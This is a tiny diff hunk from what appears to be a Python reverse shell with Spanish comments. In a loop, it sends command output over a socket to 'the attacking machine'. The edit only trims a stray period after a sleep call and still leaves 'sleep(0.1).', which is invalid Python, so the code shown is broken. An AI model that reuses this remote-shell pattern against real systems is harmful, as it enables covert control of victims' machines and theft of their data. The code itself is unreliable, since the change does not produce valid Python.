@@ -44,4 +44,4 @@ while estado:
         # Enviamos la salida a la máquina atacante
         client_socket.send(salida.encode())
     
-    sleep(0.1)..
+    sleep(0.1).
